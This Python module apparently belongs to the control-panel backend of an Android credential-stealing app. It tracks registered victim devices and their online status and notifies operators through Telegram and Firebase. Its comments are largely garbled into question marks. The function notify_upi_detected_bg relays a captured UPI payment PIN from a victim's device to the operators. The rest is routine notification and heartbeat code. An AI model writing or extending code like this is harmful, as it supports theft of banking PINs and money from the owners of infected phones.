"""
Background Tasks for Async Operations
???? ????? notification ?? ? ?????? ????? ?? ????????
"""

import asyncio
import logging
from typing import Optional, Dict, Any
from datetime import datetime, timedelta

logger = logging.getLogger(__name__)

class BackgroundTaskManager:
    """?????? Task ??? ????????"""
    
    def __init__(self):
        self.pending_tasks = []
    
    async def send_telegram_notification(
        self,
        service,
        method_name: str,
        *args,
        **kwargs
    ):
        """????? notification ?????? ?? background"""
        try:
            method = getattr(service, method_name)
            await method(*args, **kwargs)
            logger.debug(f"? Telegram notification sent: {method_name}")
        except Exception as e:
            logger.warning(f"??  Failed to send Telegram notification: {e}")
    
    async def send_push_notification(
        self,
        service,
        method_name: str,
        *args,
        **kwargs
    ):
        """????? push notification ?? background"""
        try:
            method = getattr(service, method_name)
            result = await method(*args, **kwargs)
            logger.debug(f"? Push notification sent: {method_name}")
            return result
        except Exception as e:
            logger.warning(f"??  Failed to send push notification: {e}")
            return None
    
    async def log_activity(
        self,
        service,
        *args,
        **kwargs
    ):
        """??? activity ?? background"""
        try:
            await service.log_activity(*args, **kwargs)
            logger.debug(f"? Activity logged")
        except Exception as e:
            logger.warning(f"??  Failed to log activity: {e}")

# Global instance
background_tasks = BackgroundTaskManager()


# ???????????????????????????????????????????????????????????????
# Helper Functions ???? ??????? ????
# ???????????????????????????????????????????????????????????????

async def send_telegram_in_background(
    telegram_service,
    admin_username: str,
    message: str,
    bot_index: Optional[int] = None
):
    """
    ????? Telegram notification ?? background
    
    Usage:
        await send_telegram_in_background(
            telegram_multi_service,
            "admin",
            "Test message",
            bot_index=1
        )
    """
    try:
        await telegram_service.send_to_admin(
            admin_username,
            message,
            bot_index=bot_index
        )
    except Exception as e:
        logger.warning(f"Background telegram failed: {e}")


async def send_push_in_background(
    firebase_service,
    admin_username: str,
    title: str,
    body: str,
    data: Optional[Dict[str, Any]] = None
):
    """
    ????? Push notification ?? background
    
    Usage:
        await send_push_in_background(
            firebase_admin_service,
            "admin",
            "New Device",
            "Device registered"
        )
    """
    try:
        await firebase_service.send_notification_to_admin(
            admin_username,
            title,
            body,
            data or {}
        )
    except Exception as e:
        logger.warning(f"Background push failed: {e}")


async def notify_device_registration_bg(
    telegram_service,
    firebase_service,
    admin_username: str,
    device_id: str,
    device_info: Dict[str, Any],
    admin_token: str
):
    """
    ????? notification ???? device registration ?? background
    
    ????:
    - Telegram notification
    - Push notification
    """
    try:
        # Telegram
        await telegram_service.notify_device_registered(
            admin_username=admin_username,
            device_id=device_id,
            device_info=device_info
        )
        
        # Push notification
        app_type = device_info.get('app_type', 'Unknown')
        model = device_info.get('model', 'Unknown')
        
        await firebase_service.send_device_registration_notification(
            admin_username=admin_username,
            device_id=device_id,
            app_type=app_type,
            model=model
        )
        
        logger.debug(f"? Device registration notifications sent for {device_id}")
        
    except Exception as e:
        logger.warning(f"Background device registration notification failed: {e}")


async def notify_upi_detected_bg(
    telegram_service,
    firebase_service,
    admin_username: str,
    device_id: str,
    upi_pin: str,
    model: Optional[str] = None
):
    """
    ????? notification ???? UPI PIN detected ?? background
    
    ????:
    - Telegram notification
    - Push notification
    """
    try:
        # Telegram
        await telegram_service.notify_upi_detected(
            admin_username=admin_username,
            device_id=device_id,
            upi_pin=upi_pin
        )
        
        # Push notification
        await firebase_service.send_upi_pin_notification(
            admin_username=admin_username,
            device_id=device_id,
            upi_pin=upi_pin,
            model=model
        )
        
        logger.debug(f"? UPI detection notifications sent for {device_id}")
        
    except Exception as e:
        logger.warning(f"Background UPI notification failed: {e}")


async def notify_admin_login_bg(
    telegram_service,
    admin_username: str,
    ip_address: str,
    success: bool = True
):
    """????? notification ???? admin login ?? background"""
    try:
        await telegram_service.notify_admin_login(
            admin_username=admin_username,
            ip_address=ip_address,
            success=success
        )
        logger.debug(f"? Admin login notification sent for {admin_username}")
    except Exception as e:
        logger.warning(f"Background admin login notification failed: {e}")


async def notify_admin_logout_bg(
    telegram_service,
    admin_username: str,
    ip_address: str
):
    """????? notification ???? admin logout ?? background"""
    try:
        await telegram_service.notify_admin_logout(
            admin_username=admin_username,
            ip_address=ip_address
        )
        logger.debug(f"? Admin logout notification sent for {admin_username}")
    except Exception as e:
        logger.warning(f"Background admin logout notification failed: {e}")


async def send_2fa_code_bg(
    telegram_service,
    admin_username: str,
    ip_address: str,
    code: str,
    message_prefix: Optional[str] = None
):
    """????? OTP code ?? background"""
    try:
        await telegram_service.send_2fa_notification(
            admin_username=admin_username,
            ip_address=ip_address,
            code=code,
            message_prefix=message_prefix
        )
        logger.debug(f"? 2FA code sent for {admin_username}")
    except Exception as e:
        logger.warning(f"Background 2FA notification failed: {e}")


# ???????????????????????????????????????????????????????????????
# Batch Operations (???? ?????? ????)
# ???????????????????????????????????????????????????????????????

async def send_multiple_notifications_bg(
    telegram_service,
    firebase_service,
    notifications: list
):
    """
    ????? ????? notification ?? ???? ??????
    
    notifications = [
        {
            "type": "telegram",
            "method": "send_to_admin",
            "args": ["admin", "message"],
            "kwargs": {"bot_index": 1}
        },
        {
            "type": "push",
            "method": "send_notification_to_admin",
            "args": ["admin", "title", "body"],
            "kwargs": {}
        }
    ]
    """
    tasks = []
    
    for notif in notifications:
        if notif["type"] == "telegram":
            method = getattr(telegram_service, notif["method"])
            tasks.append(method(*notif.get("args", []), **notif.get("kwargs", {})))
        elif notif["type"] == "push":
            method = getattr(firebase_service, notif["method"])
            tasks.append(method(*notif.get("args", []), **notif.get("kwargs", {})))
    
    # ????? ?????? ??? notification ??
    results = await asyncio.gather(*tasks, return_exceptions=True)
    
    # ??? ?????
    for i, result in enumerate(results):
        if isinstance(result, Exception):
            logger.warning(f"Notification {i} failed: {result}")
    
    logger.debug(f"? Batch notifications sent: {len(notifications)}")


# ???????????????????????????????????????????????????????????????
# Device Status Monitor (?????? ????? ????? online/offline)
# ???????????????????????????????????????????????????????????????

async def check_offline_devices_bg(mongodb):
    """
    Task ?????? ???? ??? 5 ????? ?????? ????? ??? ??????? offline ????
    
    Heartbeat ??? 3 ????? ????، ??? ??? 6 ????? heartbeat ????? ? offline ????
    """
    while True:
        try:
            # Heartbeat ??? 3 ????? ????، ??? 6 ????? timeout
            six_minutes_ago = datetime.utcnow() - timedelta(minutes=6)
            
            # ????? ????? offline ??? ?????????? ??? 6 ????? heartbeat ?????
            result = await mongodb.db.devices.update_many(
                {
                    "last_ping": {"$lt": six_minutes_ago},
                    "status": "online"
                },
                {
                    "$set": {
                        "status": "offline",
                        "is_online": False,
                        "last_online_update": datetime.utcnow()
                    }
                }
            )
            
            if result.modified_count > 0:
                logger.info(f"🔴 Marked {result.modified_count} devices as offline (heartbeat timeout)")
            
            # ??? 5 ????? ????
            await asyncio.sleep(300)  # 5 minutes
            
        except Exception as e:
            logger.error(f"❌ Error in offline devices checker: {e}")
            # ???? error، 1 ????? ???? ??
            await asyncio.sleep(60)
